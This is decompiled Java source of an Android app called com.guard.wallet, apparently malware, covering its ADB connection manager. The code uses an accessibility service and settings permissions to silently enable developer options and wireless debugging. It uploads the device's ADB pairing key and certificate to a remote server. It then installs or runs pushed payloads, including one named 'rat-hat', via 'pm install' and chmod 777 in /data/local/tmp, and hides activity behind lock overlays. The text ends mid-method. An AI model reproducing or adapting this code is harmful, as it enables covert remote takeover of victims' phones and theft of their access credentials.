package p005h;

import a1.AbstractC0026q;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.os.EnvironmentCompat;
import android.text.TextUtils;
import android.util.Log;
import b1.AbstractC0080b;
import b1.C0082d;
import b1.C0083e;
import b1.C0086h;
import c1.C0101d;
import c1.InterfaceC0099b;
import com.guard.wallet.LockActivity;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0209n;
import com.guard.wallet.http.d0;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ReqWifiSettingDialogVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0246b;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.File;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;
import p000a.AbstractC0000a;
import p002e.C0262b;
import p006i.C0328a;
import p012o.C0422k;
import p012o.C0431t;
import p013p.AbstractC0857b;
import p013p.CallableC0856a;
import p019w.AbstractC0956a;

/* renamed from: h.e */
/* loaded from: classes.dex */
public final class C0318e extends AbstractC0080b {

    /* renamed from: E */
    public static final Integer f605E = 5555;

    /* renamed from: F */
    public static C0318e f606F;

    /* renamed from: C */
    public PrivateKey f609C;

    /* renamed from: D */
    public Certificate f610D;

    /* renamed from: i */
    public final Context f611i;

    /* renamed from: j */
    public final ReentrantLock f612j = new ReentrantLock();

    /* renamed from: k */
    public final ReentrantLock f613k = new ReentrantLock();

    /* renamed from: l */
    public final ReentrantLock f614l = new ReentrantLock();

    /* renamed from: m */
    public final AtomicBoolean f615m = new AtomicBoolean(true);

    /* renamed from: n */
    public final AtomicInteger f616n = new AtomicInteger(0);

    /* renamed from: o */
    public final ExecutorService f617o = Executors.newFixedThreadPool(1);

    /* renamed from: p */
    public final ExecutorService f618p = Executors.newFixedThreadPool(5);

    /* renamed from: q */
    public final ExecutorService f619q = Executors.newFixedThreadPool(2);

    /* renamed from: r */
    public final ConcurrentHashMap f620r = new ConcurrentHashMap();

    /* renamed from: s */
    public final AtomicBoolean f621s = new AtomicBoolean(false);

    /* renamed from: t */
    public final AtomicLong f622t = new AtomicLong(0);

    /* renamed from: u */
    public final AtomicBoolean f623u = new AtomicBoolean(false);

    /* renamed from: v */
    public final AtomicBoolean f624v = new AtomicBoolean(false);

    /* renamed from: w */
    public final AtomicBoolean f625w = new AtomicBoolean(false);

    /* renamed from: x */
    public final AtomicInteger f626x = new AtomicInteger();

    /* renamed from: y */
    public final AtomicInteger f627y = new AtomicInteger(0);

    /* renamed from: z */
    public final AtomicInteger f628z = new AtomicInteger(0);

    /* renamed from: A */
    public final AtomicBoolean f607A = new AtomicBoolean(false);

    /* renamed from: B */
    public final AtomicBoolean f608B = new AtomicBoolean(false);

    public C0318e(Context context) {
        this.f611i = context;
        this.f94e = Build.VERSION.SDK_INT;
    }

    /* renamed from: S */
    public static C0318e m844S() {
        C0318e c0318e;
        synchronized (C0318e.class) {
            c0318e = f606F;
        }
        return c0318e;
    }

    /* renamed from: T */
    public static void m845T() {
        boolean isPaired;
        Context m653Z = AbstractC0251g.m653Z();
        if (f606F != null || m653Z == null) {
            return;
        }
        synchronized (C0318e.class) {
            if (f606F == null) {
                C0318e c0318e = new C0318e(m653Z);
                f606F = c0318e;
                synchronized (ADBConfig.class) {
                    isPaired = AbstractC0252h.m689J().isPaired();
                }
                c0318e.f625w.set(isPaired);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:28:0x0046 A[Catch: Exception -> 0x0166, TryCatch #0 {Exception -> 0x0166, blocks: (B:3:0x0001, B:5:0x0007, B:7:0x000d, B:12:0x0019, B:13:0x001e, B:17:0x0029, B:20:0x0030, B:22:0x0036, B:26:0x0040, B:28:0x0046, B:29:0x0049, B:31:0x004f, B:32:0x0052, B:34:0x0064, B:36:0x0072, B:38:0x0089, B:40:0x008f, B:41:0x0092, B:43:0x0098, B:47:0x00a1, B:50:0x00a8, B:52:0x00ae, B:54:0x00b4, B:55:0x00ba, B:57:0x00c0, B:58:0x00ce, B:60:0x00dc, B:62:0x00e0, B:64:0x00e6, B:65:0x00ec, B:67:0x00f2, B:69:0x00f8, B:71:0x00fe, B:73:0x0102, B:75:0x010d, B:81:0x0149, B:85:0x0144, B:86:0x0150, B:77:0x0122, B:79:0x0128, B:80:0x012b), top: B:2:0x0001, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:31:0x004f A[Catch: Exception -> 0x0166, TryCatch #0 {Exception -> 0x0166, blocks: (B:3:0x0001, B:5:0x0007, B:7:0x000d, B:12:0x0019, B:13:0x001e, B:17:0x0029, B:20:0x0030, B:22:0x0036, B:26:0x0040, B:28:0x0046, B:29:0x0049, B:31:0x004f, B:32:0x0052, B:34:0x0064, B:36:0x0072, B:38:0x0089, B:40:0x008f, B:41:0x0092, B:43:0x0098, B:47:0x00a1, B:50:0x00a8, B:52:0x00ae, B:54:0x00b4, B:55:0x00ba, B:57:0x00c0, B:58:0x00ce, B:60:0x00dc, B:62:0x00e0, B:64:0x00e6, B:65:0x00ec, B:67:0x00f2, B:69:0x00f8, B:71:0x00fe, B:73:0x0102, B:75:0x010d, B:81:0x0149, B:85:0x0144, B:86:0x0150, B:77:0x0122, B:79:0x0128, B:80:0x012b), top: B:2:0x0001, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:34:0x0064 A[Catch: Exception -> 0x0166, TryCatch #0 {Exception -> 0x0166, blocks: (B:3:0x0001, B:5:0x0007, B:7:0x000d, B:12:0x0019, B:13:0x001e, B:17:0x0029, B:20:0x0030, B:22:0x0036, B:26:0x0040, B:28:0x0046, B:29:0x0049, B:31:0x004f, B:32:0x0052, B:34:0x0064, B:36:0x0072, B:38:0x0089, B:40:0x008f, B:41:0x0092, B:43:0x0098, B:47:0x00a1, B:50:0x00a8, B:52:0x00ae, B:54:0x00b4, B:55:0x00ba, B:57:0x00c0, B:58:0x00ce, B:60:0x00dc, B:62:0x00e0, B:64:0x00e6, B:65:0x00ec, B:67:0x00f2, B:69:0x00f8, B:71:0x00fe, B:73:0x0102, B:75:0x010d, B:81:0x0149, B:85:0x0144, B:86:0x0150, B:77:0x0122, B:79:0x0128, B:80:0x012b), top: B:2:0x0001, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0089 A[Catch: Exception -> 0x0166, TryCatch #0 {Exception -> 0x0166, blocks: (B:3:0x0001, B:5:0x0007, B:7:0x000d, B:12:0x0019, B:13:0x001e, B:17:0x0029, B:20:0x0030, B:22:0x0036, B:26:0x0040, B:28:0x0046, B:29:0x0049, B:31:0x004f, B:32:0x0052, B:34:0x0064, B:36:0x0072, B:38:0x0089, B:40:0x008f, B:41:0x0092, B:43:0x0098, B:47:0x00a1, B:50:0x00a8, B:52:0x00ae, B:54:0x00b4, B:55:0x00ba, B:57:0x00c0, B:58:0x00ce, B:60:0x00dc, B:62:0x00e0, B:64:0x00e6, B:65:0x00ec, B:67:0x00f2, B:69:0x00f8, B:71:0x00fe, B:73:0x0102, B:75:0x010d, B:81:0x0149, B:85:0x0144, B:86:0x0150, B:77:0x0122, B:79:0x0128, B:80:0x012b), top: B:2:0x0001, inners: #1 }] */
    /* renamed from: Y */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m846Y(BlockViewVO blockViewVO) {
        boolean z2;
        try {
            if (MyAccessibilityService.m554P() != null && Build.VERSION.SDK_INT >= 30 && !AbstractC0249e.m619h()) {
                if (blockViewVO == null) {
                    blockViewVO = new BlockViewVO(false, null, true, true);
                }
                if (MyAccessibilityService.m554P().m529j() || AbstractC0956a.m1443a()) {
                    return false;
                }
                if (!AbstractC0252h.m710n() && !AbstractC0252h.m711o()) {
                    z2 = false;
                    if (!AbstractC0252h.m711o()) {
                        AbstractC0207l.m420c();
                    }
                    if (!AbstractC0251g.m638K()) {
                        m847Z();
                    }
                    if (Objects.equals(AbstractC0251g.z0().getIsWifiConnected(), 1)) {
                        String str = AbstractC0207l.f252a;
                        String m708l = AbstractC0252h.m708l("deviceId");
                        if (!AbstractC0026q.m151B(m708l)) {
                            new C0204i(AbstractC0207l.f252a).m405d(new ReqWifiSettingDialogVO(m708l), "/api/navigate/wifiDialog.json", new C0209n());
                        }
                        return false;
                    }
                    if (!AbstractC0251g.m637J()) {
                        a0();
                    }
                    if ((AbstractC0251g.p0() && AbstractC0251g.r0() && !z2) || !AbstractC0251g.n0()) {
                        return false;
                    }
                    if (C0262b.f433a != null && AbstractC0249e.m623l()) {
                        C0262b.m739e();
                        AbstractC0251g.T0(10);
                    }
                    if (AbstractC0249e.m621j()) {
                        MyAccessibilityService.m554P().getClass();
                        blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
                    }
                    AbstractC0184g.m347a(blockViewVO);
                    if (!AbstractC0251g.p1(new ReqUnlockDeviceVO())) {
                        AbstractC0184g.m349c();
                        return false;
                    }
                    if (LockActivity.m331b() != null) {
                        LockActivity.m330a();
                        AbstractC0251g.T0(10);
                    }
                    if (AbstractC0026q.m156G() && !AbstractC0026q.m150A() && !AbstractC0026q.m164O(null, null)) {
                        AbstractC0184g.m349c();
                        return false;
                    }
                    AbstractC0207l.m437t("PAIR_RUNNING_EVENT");
                    if (AbstractC0251g.m638K()) {
                        MyAccessibilityService.m554P().m559H(true, true);
                        MyAccessibilityService.m554P().m524e();
                        AbstractC0251g.T0(10);
                        AbstractC0251g.f1();
                    } else {
                        MyAccessibilityService.m554P().m559H(true, true);
                        MyAccessibilityService.m554P().m520a();
                        MyAccessibilityService m554P = MyAccessibilityService.m554P();
                        m554P.getClass();
                        try {
                            if (m554P.m533n() != null) {
                                m554P.m545z();
                            }
                            m554P.f303a.add(new C0431t());
                            m554P.m539t(C0431t.class.getName(), C0431t.m1141X());
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                        }
                        AbstractC0251g.T0(10);
                        AbstractC0251g.g1();
                    }
                    return true;
                }
                z2 = true;
                if (!AbstractC0252h.m711o()) {
                }
                if (!AbstractC0251g.m638K()) {
                }
                if (Objects.equals(AbstractC0251g.z0().getIsWifiConnected(), 1)) {
                }
            }
            return false;
        } catch (Exception e3) {
            AbstractC0026q.m186s("AdbConnectionManager", e3);
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x003e A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:15:0x003f  */
    /* renamed from: Z */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m847Z() {
        boolean z2;
        String str;
        try {
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
        }
        if (AbstractC0251g.m653Z() != null && (Settings.System.canWrite(AbstractC0251g.m653Z()) || AbstractC0251g.m663j())) {
            Log.d("ApplicationUtil", "已有系统设置修改权限");
            z2 = true;
            Settings.Global.putInt(AbstractC0251g.m653Z().getContentResolver(), "development_settings_enabled", 1);
            if (AbstractC0251g.m638K()) {
                Log.d("ApplicationUtil", "已有系统设置修改权限,开启开发者选项成功");
                if (z2) {
                    if (!AbstractC0026q.m154E(7912)) {
                        Log.d("AdbConnectionManager", "请求7912开启开发者选项");
                        str = "http://127.0.0.1:7912";
                    } else {
                        if (AbstractC0026q.m154E(7911)) {
                            return;
                        }
                        Log.d("AdbConnectionManager", "请求7911开启开发者选项");
                        str = "http://127.0.0.1:7911";
                    }
                    AbstractC0207l.m429l(str);
                    return;
                }
                return;
            }
        }
        z2 = false;
        if (z2) {
        }
    }

    public static void a0() {
        Log.d("AdbConnectionManager", "准备开启无线调试");
        boolean z2 = false;
        if (Objects.equals(AbstractC0251g.z0().getIsWifiConnected(), 0)) {
            Log.d("AdbConnectionManager", "WIFI无线网络没有连接");
            return;
        }
        if (AbstractC0251g.p0()) {
            Log.d("AdbConnectionManager", "锁屏中,放弃开启无线调试");
            return;
        }
        if (MyAccessibilityService.m554P() == null) {
            Log.d("AdbConnectionManager", "无障碍服务未开启,放弃开启无线调试");
            return;
        }
        if (MyAccessibilityService.m554P() != null && !MyAccessibilityService.m554P().m565V()) {
            Log.d("AdbConnectionManager", "无障碍监听窗口初始化未完成,放弃开启无线调试");
            return;
        }
        if (AbstractC0249e.m623l() && !AbstractC0251g.m638K()) {
            m847Z();
        }
        try {
            if (AbstractC0251g.m653Z() != null && (Settings.System.canWrite(AbstractC0251g.m653Z()) || AbstractC0251g.m663j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Settings.Global.putInt(AbstractC0251g.m653Z().getContentResolver(), "adb_wifi_enabled", 1);
                if (AbstractC0251g.m637J()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,开启无线调试成功");
                    z2 = true;
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
        }
        if (z2) {
            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,本地开启无线调试");
            return;
        }
        if (!AbstractC0026q.m154E(7912)) {
            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,请求7912开启无线调试");
            AbstractC0207l.m430m("http://127.0.0.1:7912");
        } else {
            if (AbstractC0026q.m154E(7911)) {
                return;
            }
            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,请求7911开启无线调试");
            AbstractC0207l.m430m("http://127.0.0.1:7911");
        }
    }

    @Override // b1.AbstractC0080b
    /* renamed from: B */
    public final Certificate mo300B() {
        if (this.f610D == null) {
            this.f610D = AbstractC0251g.H0();
        }
        if (this.f610D == null) {
            String m708l = AbstractC0252h.m708l("cert.pem.url");
            String i02 = AbstractC0251g.i0();
            this.f610D = (AbstractC0026q.m151B(m708l) || AbstractC0026q.m151B(i02) || !AbstractC0857b.m1241b(m708l, i02.concat("/").concat("cert.pem"))) ? null : AbstractC0251g.H0();
        }
        return this.f610D;
    }

    @Override // b1.AbstractC0080b
    /* renamed from: C */
    public final PrivateKey mo301C() {
        if (this.f609C == null) {
            this.f609C = AbstractC0251g.I0();
        }
        if (this.f609C == null) {
            String m708l = AbstractC0252h.m708l("private.key.url");
            String i02 = AbstractC0251g.i0();
            this.f609C = (AbstractC0026q.m151B(m708l) || AbstractC0026q.m151B(i02) || !AbstractC0857b.m1241b(m708l, i02.concat("/").concat("private.key"))) ? null : AbstractC0251g.I0();
        }
        return this.f609C;
    }

    @Override // b1.AbstractC0080b
    /* renamed from: D */
    public final boolean mo302D() {
        boolean z2;
        if (!this.f623u.get()) {
            return false;
        }
        synchronized (this.f90a) {
            C0082d c0082d = this.f91b;
            if (c0082d != null) {
                Socket socket = c0082d.f99a;
                if ((!socket.isClosed() && socket.isConnected()) && this.f91b.f112n) {
                    z2 = true;
                }
            }
            z2 = false;
        }
        return z2;
    }

    /* renamed from: G */
    public final boolean m848G(final String str, final String str2, String str3, final String str4) {
        int i2 = 0;
        if (!AbstractC0026q.m151B(str2)) {
            if (AbstractC0026q.m151B(str3)) {
                str3 = AbstractC0026q.m191x(str2);
                if (AbstractC0026q.m151B(str3)) {
                    str3 = EnvironmentCompat.MEDIA_UNKNOWN;
                }
            }
            ConcurrentHashMap concurrentHashMap = this.f620r;
            if (!concurrentHashMap.containsKey(str2) && mo302D()) {
                concurrentHashMap.put(str2, Long.valueOf(new Date().getTime()));
                final Future submit = this.f618p.submit(new CallableC0856a(str2, str3, i2));
                this.f619q.submit(new Runnable() { // from class: h.d
                    /* JADX WARN: Code restructure failed: missing block: B:29:0x0039, code lost:
                    
                        r5 = move-exception;
                     */
                    /* JADX WARN: Code restructure failed: missing block: B:30:0x003a, code lost:
                    
                        a1.AbstractC0026q.m186s("AdbConnectionManager", r5);
                        r5 = null;
                     */
                    @Override // java.lang.Runnable
                    /*
                        Code decompiled incorrectly, please refer to instructions dump.
                    */
                    public final void run() {
                        Future future;
                        C0318e c0318e = C0318e.this;
                        c0318e.getClass();
                        PushResponseVO pushResponseVO = new PushResponseVO();
                        pushResponseVO.setLogId(str);
                        String str5 = str2;
                        pushResponseVO.setFileUrl(str5);
                        boolean z2 = true;
                        pushResponseVO.setInstallMethod(1);
                        pushResponseVO.setDownloadResult(-1);
                        pushResponseVO.setInstallResult(-1);
                        pushResponseVO.setStartResult(-1);
                        do {
                            future = submit;
                        } while (!future.isDone());
                        String str6 = (String) future.get();
                        boolean m151B = AbstractC0026q.m151B(str6);
                        ConcurrentHashMap concurrentHashMap2 = c0318e.f620r;
                        int i3 = 0;
                        if (m151B) {
                            if (!AbstractC0026q.m151B(str5)) {
                                concurrentHashMap2.remove(str5);
                            }
                            pushResponseVO.setDownloadResult(0);
                        } else {
                            pushResponseVO.setDownloadResult(1);
                            String concat = "pm install -d -t -r".concat(" ").concat(str6);
                            if (!AbstractC0026q.m154E(7912)) {
                                if (c0318e.m857P(concat, new C0328a("Success", z2, 1 == true ? 1 : 0), new C0328a("INSTALL_FAILED", 1 == true ? 1 : 0, i3)) == 1) {
                                    pushResponseVO.setInstallResult(1);
                                }
                                String str7 = str4;
                                if (!AbstractC0026q.m151B(str7) && c0318e.m855N(str7)) {
                                    pushResponseVO.setStartResult(1);
                                }
                            }
                            AbstractC0026q.m181n(str6);
                            if (!AbstractC0026q.m151B(str5)) {
                                concurrentHashMap2.remove(str5);
                            }
                        }
                        AbstractC0207l.m436s(pushResponseVO);
                    }
                });
                return true;
            }
        }
        return false;
    }

    /* renamed from: H */
    public final void m849H() {
        ReentrantLock reentrantLock = this.f613k;
        if (reentrantLock.tryLock()) {
            try {
            } catch (Exception e2) {
                AbstractC0026q.m186s("AdbConnectionManager", e2);
            }
            if (AbstractC0956a.m1443a()) {
                Log.d("AdbConnectionManager", "进入省电模式保活策略");
                reentrantLock.unlock();
                return;
            }
            if (Build.VERSION.SDK_INT < 30 || AbstractC0249e.m619h()) {
                Log.d("AdbConnectionManager", "此处添加 Android 10及以下版本、华为鸿蒙的ADB连接逻辑");
            } else {
                if (!AbstractC0251g.m637J() && Objects.equals(AbstractC0251g.z0().getIsWifiConnected(), 1)) {
                    a0();
                }
                if (mo301C() != null && mo300B() != null) {
                    this.f617o.submit(new RunnableC0314a(this, 0));
                }
            }
            reentrantLock.unlock();
        }
    }

    /* renamed from: I */
    public final boolean m850I(final String str, final String str2, String str3, final String str4) {
        int i2 = 0;
        if (!AbstractC0026q.m151B(str2)) {
            if (AbstractC0026q.m151B(str3)) {
                str3 = AbstractC0026q.m191x(str2);
                if (AbstractC0026q.m151B(str3)) {
                    str3 = EnvironmentCompat.MEDIA_UNKNOWN;
                }
            }
            final String str5 = str3;
            ConcurrentHashMap concurrentHashMap = this.f620r;
            if (!concurrentHashMap.containsKey(str2) && mo302D()) {
                concurrentHashMap.put(str2, Long.valueOf(new Date().getTime()));
                final Future submit = this.f618p.submit(new CallableC0856a(str2, str5, i2));
                this.f619q.submit(new Runnable() { // from class: h.b
                    /* JADX WARN: Code restructure failed: missing block: B:30:0x0035, code lost:
                    
                        r5 = move-exception;
                     */
                    /* JADX WARN: Code restructure failed: missing block: B:31:0x0036, code lost:
                    
                        a1.AbstractC0026q.m186s("AdbConnectionManager", r5);
                        r5 = null;
                     */
                    @Override // java.lang.Runnable
                    /*
                        Code decompiled incorrectly, please refer to instructions dump.
                    */
                    public final void run() {
                        Future future;
                        C0318e c0318e = C0318e.this;
                        c0318e.getClass();
                        PushResponseVO pushResponseVO = new PushResponseVO();
                        pushResponseVO.setLogId(str);
                        String str6 = str2;
                        pushResponseVO.setFileUrl(str6);
                        pushResponseVO.setInstallMethod(0);
                        String str7 = str5;
                        String concat = "/data/local/tmp/".concat(str7);
                        do {
                            future = submit;
                        } while (!future.isDone());
                        String str8 = (String) future.get();
                        boolean m151B = AbstractC0026q.m151B(str8);
                        ConcurrentHashMap concurrentHashMap2 = c0318e.f620r;
                        if (m151B) {
                            if (AbstractC0026q.m151B(str6)) {
                                return;
                            }
                            concurrentHashMap2.remove(str6);
                            return;
                        }
                        String concat2 = "mv".concat(" -f ").concat(str8).concat(" ").concat(concat);
                        String concat3 = "chmod".concat(" ").concat("777").concat(" ").concat(concat);
                        if (c0318e.m855N(concat2) && c0318e.m855N(concat3)) {
                            pushResponseVO.setInstallResult(1);
                            if (Objects.equals(str7, "rat-hat")) {
                                AbstractC0252h.m722z(true);
                            }
                            String str9 = str4;
                            if (!AbstractC0026q.m151B(str9)) {
                                c0318e.m856O(str9);
                                pushResponseVO.setStartResult(1);
                            }
                        }
                        if (!AbstractC0026q.m151B(str6)) {
                            concurrentHashMap2.remove(str6);
                        }
                        AbstractC0207l.m436s(pushResponseVO);
                    }
                });
                return true;
            }
        }
        return false;
    }

    /* renamed from: J */
    public final synchronized CheckPortResult m851J(int i2) {
        if (this.f611i != null && i2 > 0 && mo301C() != null && mo300B() != null) {
            try {
                if (mo302D()) {
                    CheckPortResult checkPortResult = new CheckPortResult();
                    checkPortResult.setConnected(true);
                    checkPortResult.setDebugPort(AbstractC0252h.m697a());
                    checkPortResult.setConnectedDevice("com.guard.wallet");
                    this.f627y.set(0);
                    this.f623u.set(true);
                    this.f624v.set(true);
                    return checkPortResult;
                }
                TimeUnit timeUnit = TimeUnit.MILLISECONDS;
                this.f95f = 5000L;
                this.f96g = timeUnit;
                int m306y = m306y(i2, AbstractC0251g.c0(this.f611i));
                if (m306y > 0) {
                    CheckPortResult checkPortResult2 = new CheckPortResult();
                    checkPortResult2.setConnected(true);
                    checkPortResult2.setDebugPort(Integer.valueOf(m306y));
                    checkPortResult2.setConnectedDevice("com.guard.wallet");
                    AbstractC0252h.m720x(checkPortResult2);
                    this.f627y.set(0);
                    this.f623u.set(true);
                    this.f624v.set(true);
                    return checkPortResult2;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AdbConnectionManager", e2);
            }
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:27:0x006a  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x0102 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x00eb  */
    /* renamed from: K */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m852K(String str, int i2, String str2) {
        boolean z2;
        if (this.f614l.tryLock()) {
            boolean z3 = false;
            if (AbstractC0026q.m151B(str2)) {
                this.f614l.unlock();
                return false;
            }
            if (this.f611i != null) {
                if (AbstractC0026q.m151B(str)) {
                    str = AbstractC0251g.c0(this.f611i);
                }
                if (i2 <= 0) {
                    i2 = m853L().intValue();
                }
                try {
                    if (AbstractC0251g.m645R()) {
                        Log.d("AdbConnectionManager", "本地配对密钥文件创建完成");
                        z2 = true;
                    } else {
                        z2 = false;
                    }
                    try {
                        this.f609C = AbstractC0251g.I0();
                        this.f610D = AbstractC0251g.H0();
                        if (Build.VERSION.SDK_INT >= 30) {
                            Log.d("AdbConnectionManager", "正在配对中......");
                            z3 = m304F(str, i2, str2);
                        }
                    } catch (Throwable th) {
                        th = th;
                        AbstractC0026q.m187t("AdbConnectionManager", th);
                        if (z3) {
                        }
                        if (this.f625w.get()) {
                        }
                        this.f625w.set(z3);
                        synchronized (ADBConfig.class) {
                        }
                    }
                } catch (Throwable th2) {
                    th = th2;
                    z2 = false;
                }
                if (z3) {
                    Log.e("AdbConnectionManager", "无线调试配对失败");
                } else {
                    Log.d("AdbConnectionManager", "无线调试配对成功");
                    if (z2) {
                        Log.d("AdbConnectionManager", "无线调试配对成功,上传本地配对文件");
                        try {
                            String i02 = AbstractC0251g.i0();
                            if (!AbstractC0026q.m151B(i02)) {
                                LinkedList linkedList = new LinkedList();
                                String concat = i02.concat("/").concat("private.key");
                                String concat2 = i02.concat("/").concat("cert.pem");
                                File file = new File(concat);
                                File file2 = new File(concat2);
                                if (file.exists() && file2.exists()) {
                                    linkedList.add(file);
                                    linkedList.add(file2);
                                    String str3 = AbstractC0207l.f252a;
                                    String m708l = AbstractC0252h.m708l("deviceId");
                                    if (!AbstractC0026q.m151B(m708l) && !linkedList.isEmpty()) {
                                        new C0204i().m410j(new UploadFileVO(m708l, "100012"), "/api/pairKeyFile/batch.json", linkedList, new d0());
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AdbKeyUtils", e2);
                        }
                    }
                }
                if (this.f625w.get() || z3) {
                    this.f625w.set(z3);
                    synchronized (ADBConfig.class) {
                        ADBConfig m689J = AbstractC0252h.m689J();
                        m689J.setPaired(z3);
                        m689J.setUpdateTime(new Date().getTime());
                        AbstractC0252h.m683D(AbstractC0252h.m693N(m689J), "ADBConfig");
                        AbstractC0207l.m433p(m689J);
                    }
                }
            }
            this.f614l.unlock();
        }
        return this.f625w.get();
    }

    /* renamed from: L */
    public final Integer m853L() {
        Context context = this.f611i;
        if (context == null) {
            return null;
        }
        final AtomicInteger atomicInteger = new AtomicInteger(-1);
        final CountDownLatch countDownLatch = new CountDownLatch(1);
        C0101d c0101d = new C0101d(context, "adb-tls-pairing", new InterfaceC0099b() { // from class: h.c
            @Override // c1.InterfaceC0099b
            /* renamed from: a */
            public final void mo298a(InetAddress inetAddress, int i2) {
                atomicInteger.set(i2);
                countDownLatch.countDown();
            }
        });
        c0101d.m328a();
        try {
            try {
                if (!countDownLatch.await(30L, TimeUnit.SECONDS)) {
                    return null;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("AdbConnectionManager", e2);
            }
            AtomicInteger atomicInteger2 = this.f626x;
            atomicInteger2.set(atomicInteger.get());
            return Integer.valueOf(atomicInteger2.get());
        } finally {
            c0101d.m329b();
        }
    }

    /* renamed from: M */
    public final CheckPortResult m854M() {
        CheckPortResult checkPortResult = null;
        if (m860U() && mo301C() != null && mo300B() != null && AbstractC0251g.m637J()) {
            ReentrantLock reentrantLock = this.f612j;
            if (reentrantLock.tryLock()) {
                this.f624v.set(false);
                int i2 = 2;
                ExecutorService newFixedThreadPool = Executors.newFixedThreadPool(2);
                LinkedList linkedList = new LinkedList();
                for (int i3 = 1; i3 <= 4; i3++) {
                    linkedList.add(newFixedThreadPool.submit(new CallableC0856a(Integer.valueOf(((i3 - 1) * 5000) + 30000), Integer.valueOf(((i3 * 5000) + 30000) - 1), i2)));
                }
                while (!linkedList.isEmpty()) {
                    try {
                        ListIterator listIterator = linkedList.listIterator();
                        while (listIterator.hasNext()) {
                            Future future = (Future) listIterator.next();
                            if (future.isDone()) {
                                CheckPortResult checkPortResult2 = (CheckPortResult) future.get();
                                future.cancel(true);
                                listIterator.remove();
                                if (checkPortResult2 != null) {
                                    checkPortResult = checkPortResult2;
                                }
                            }
                        }
                    } catch (Exception e2) {
                        if (!AbstractC0026q.m151B(e2.getMessage())) {
                            AbstractC0026q.m186s("AdbConnectionManager", e2);
                        }
                    }
                }
                newFixedThreadPool.shutdown();
                reentrantLock.unlock();
            }
        }
        return checkPortResult;
    }

    /* renamed from: N */
    public final boolean m855N(String str) {
        if (AbstractC0026q.m151B(str)) {
            return false;
        }
        return m857P(AbstractC0000a.m16l("if ", str, "; then echo \"Success\"; else echo \"Failed\"; fi"), new C0328a("Success", true, 1 == true ? 1 : 0), new C0328a("Failed", 1 == true ? 1 : 0, 1 == true ? 1 : 0)) == 1;
    }

    /* renamed from: O */
    public final void m856O(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        try {
            C0086h m303E = m303E(new String[0], 1);
            m303E.m317B(2000L);
            C0083e c0083e = new C0083e(m303E);
            c0083e.write(String.format("%1$s\n", str).getBytes(StandardCharsets.UTF_8));
            c0083e.flush();
            c0083e.flush();
            m303E.close();
        } catch (Exception e2) {
            AbstractC0026q.m186s("AdbConnectionManager", e2);
        }
    }

    /* renamed from: P */
    public final int m857P(String str, C0328a c0328a, C0328a c0328a2) {
        LinkedList linkedList = new LinkedList();
        LinkedList linkedList2 = new LinkedList();
        linkedList.add(c0328a);
        linkedList2.add(c0328a2);
        return m858Q(str, linkedList, linkedList2);
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x0048 A[Catch: Exception -> 0x005a, TryCatch #0 {Exception -> 0x005a, blocks: (B:7:0x0009, B:10:0x001f, B:12:0x0025, B:15:0x0030, B:16:0x0033, B:17:0x0036, B:19:0x003c, B:24:0x0048, B:29:0x0052, B:35:0x0056), top: B:6:0x0009 }] */
    /* JADX WARN: Removed duplicated region for block: B:34:0x0056 A[SYNTHETIC] */
    /* renamed from: Q */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final int m858Q(String str, LinkedList linkedList, LinkedList linkedList2) {
        C0086h m303E;
        LinkedList linkedList3;
        AtomicInteger atomicInteger;
        LinkedList linkedList4;
        boolean z2;
        int i2;
        if (AbstractC0026q.m151B(str)) {
            return 5;
        }
        try {
            m303E = m303E(new String[]{str}, 1);
